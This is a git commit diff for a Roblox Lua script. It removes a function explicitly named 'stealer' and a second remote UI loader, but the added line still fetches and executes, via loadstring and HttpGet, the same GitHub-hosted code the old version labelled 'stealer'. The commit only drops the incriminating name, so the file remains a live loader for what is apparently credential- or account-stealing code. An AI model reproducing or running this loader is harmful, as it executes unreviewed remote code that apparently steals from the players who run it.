e8138d3147d81b6123f8303475db9057000438ca
Seuj09 <138261033+Seuj09@users.noreply.github.com>
2025-08-18 15:17:16 +0800

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,9 +1,1 @@
-local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Seuj09/X-scripts/refs/heads/main/Script.lua'))()
-end
-local function loadui()
-  loadstring(game:HttpGet("https://get.nathub.xyz/loader"))();
-end
-
-task.spawn(stealer)
-task.spawn(loadui)
+ loadstring(game:HttpGet('https://raw.githubusercontent.com/Seuj09/X-scripts/refs/heads/main/Script.lua'))()
